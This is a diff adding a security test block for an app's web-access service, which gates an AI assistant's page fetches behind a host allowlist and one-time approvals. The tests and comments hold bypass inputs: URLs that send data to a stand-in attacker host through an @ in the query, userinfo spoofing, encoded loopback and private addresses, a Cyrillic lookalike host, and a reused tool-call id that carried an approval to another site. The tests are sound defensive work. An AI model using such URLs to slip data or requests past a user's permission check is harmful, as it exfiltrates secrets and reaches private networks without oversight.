@@ -179,6 +179,154 @@ describe('WebAccessService', () => {
     });
   });
 
+  describe('security pass 2026-10-05', () => {
+    const page = (body = '<p>ok</p>') =>
+      jest.fn(() =>
+        Promise.resolve({ ok: true, status: 200, text: async () => body }),
+      );
+
+    it('does not mistake an @ in the query for the host (RN URL bypass)', async () => {
+      // React Native's URL read this as github.com — allowed, no prompt —
+      // while the request went to evil.example with the data in the query.
+      const sneaky = call('https://evil.example/c?d=SECRET&x=@github.com');
+      expect(webAccessService.hostOf(sneaky.input.url)).toBe('evil.example');
+      expect(webAccessService.callNeedsPermission(sneaky)).toBe(true);
+
+      (global as any).fetch = page();
+      await expect(
+        webAccessService.fetchPage(sneaky.input.url),
+      ).rejects.toThrow('evil.example is not on your allowed list');
+      expect((global as any).fetch).not.toHaveBeenCalled();
+    });
+
+    it('never reaches the local network through an @ either', async () => {
+      (global as any).fetch = page();
+      for (const url of [
+        'http://192.168.1.1/admin@github.com/',
+        'http://127.0.0.1:11434/api/tags?x=@github.com',
+      ]) {
+        await expect(webAccessService.fetchPage(url)).rejects.toThrow(
+          'private network',
+        );
+      }
+      expect((global as any).fetch).not.toHaveBeenCalled();
+    });
+
+    it('refuses userinfo and other spellings of a private address', async () => {
+      (global as any).fetch = page();
+      for (const url of [
+        'https://github.com@evil.example/',
+        'http://2130706433/',
+        'http://0x7f000001/',
+        'http://[::1]:8080/',
+        'http://[::ffff:127.0.0.1]/',
+        'http://100.64.0.1/',
+      ]) {
+        await expect(webAccessService.fetchPage(url)).rejects.toThrow();
+      }
+      expect((global as any).fetch).not.toHaveBeenCalled();
+    });
+
+    it('fetches the URL it checked, not the raw string', async () => {
+      (global as any).fetch = page();
+      await webAccessService.fetchPage('  HTTPS://GitHub.com./x  ');
+      expect((global as any).fetch.mock.calls[0][0]).toBe(
+        'https://github.com/x',
+      );
+    });
+
+    it('holds every caller to the list, not only the assistant', async () => {
+      // Scripts, addons and remote MCP agents call fetchPage directly; with
+      // nobody to ask, a site off the list is refused.
+      (global as any).fetch = page();
+      await expect(
+        webAccessService.fetchPage('https://example.com/'),
+      ).rejects.toThrow('example.com is not on your allowed list');
+    });
+
+    it('spends a one-time approval on that one URL', async () => {
+      (global as any).fetch = page();
+      const once = call('https://example.com/report', 'fetch_page_0');
+      webAccessService.permitOnce(once);
+
+      await expect(
+        webAccessService.fetchPage('https://example.com/report'),
+      ).resolves.toMatchObject({ text: 'ok' });
+      // Spent: the same URL again needs asking again.
+      await expect(
+        webAccessService.fetchPage('https://example.com/report'),
+      ).rejects.toThrow('not on your allowed list');
+    });
+
+    it('does not let a reused call id carry an approval to another site', () => {
+      // Gemini names its calls fetch_page_0, fetch_page_1… A permit kept by id
+      // let every later first-in-a-reply fetch, anywhere, through unasked.
+      webAccessService.permitOnce(
+        call('https://example.com/a', 'fetch_page_0'),
+      );
+
+      expect(
+        webAccessService.callNeedsPermission(
+          call('https://evil.example/?d=secret', 'fetch_page_0'),
+        ),
+      ).toBe(true);
+    });
+
+    it('forgets unused approvals at the end of a turn', () => {
+      const once = call('https://example.com/a');
+      webAccessService.permitOnce(once);
+      webAccessService.clearPermits();
+      expect(webAccessService.callNeedsPermission(once)).toBe(true);
+    });
+
+    it('ignores a permit request that is not a fetch, or not a URL', () => {
+      webAccessService.permitOnce({ id: 'x', name: 'send_message', input: {} });
+      webAccessService.permitOnce(call('not a url'));
+      expect(
+        webAccessService.callNeedsPermission(call('https://example.com/')),
+      ).toBe(true);
+    });
+
+    it('follows a redirect within a site approved once', async () => {
+      (global as any).fetch = jest.fn(() =>
+        Promise.resolve({
+          ok: true,
+          status: 200,
+          url: 'https://example.com/final',
+          text: async () => '<p>moved</p>',
+        }),
+      );
+      webAccessService.permitOnce(call('https://example.com/start'));
+
+      await expect(
+        webAccessService.fetchPage('https://example.com/start'),
+      ).resolves.toMatchObject({ text: 'moved' });
+    });
+
+    it('will not remember a lookalike or an address as a site', async () => {
+      await webAccessService.allowHost('gіthub.com'); // Cyrillic i
+      await webAccessService.allowHost('[');
+      await webAccessService.allowHost('192.168.1.1');
+      expect(webAccessService.listHosts()).toEqual(
+        [...DEFAULT_ALLOWED_HOSTS].sort(),
+      );
+    });
+
+    it('drops anything that is not a host from a stored or restored list', async () => {
+      await AsyncStorage.setItem(
+        '@AndroidIRCX:aiAllowedHosts',
+        JSON.stringify(['example.org', '[', '*', 'gіthub.com', 42]),
+      );
+      webAccessService.resetForTests();
+      await webAccessService.load();
+
+      expect(webAccessService.listHosts()).toContain('example.org');
+      expect(webAccessService.listHosts()).not.toContain('[');
+      expect(webAccessService.listHosts()).not.toContain('*');
+      expect(webAccessService.isAllowed('[')).toBe(false);
+    });
+  });
+
   describe('reading a page', () => {
     const respond = (body: string, ok = true, status = 200) =>
       Promise.resolve({ ok, status, text: async () => body });
